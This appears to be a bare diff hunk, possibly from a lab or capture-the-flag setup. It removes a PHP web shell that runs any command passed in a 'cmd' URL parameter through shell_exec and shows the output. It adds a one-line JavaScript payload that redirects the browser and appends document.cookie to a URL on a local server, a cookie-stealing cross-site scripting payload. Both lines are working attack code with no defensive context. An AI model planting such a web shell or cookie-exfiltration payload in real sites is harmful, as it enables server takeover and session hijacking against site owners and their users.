@@ -1,10 +1,1 @@
-<?php
-$cmd = $_GET["cmd"]; if(!empty($cmd)){
-    $result = shell_exec($cmd);
-}
-?>
-
-<form method="GET">
-<input type="text" name="cmd"> <input type="submit" value="EXECUTE"> </form>
-<hr>
-<?=$result?>
+location.href='http://127.0.0.1:8000/memo?memo='+document.cookie
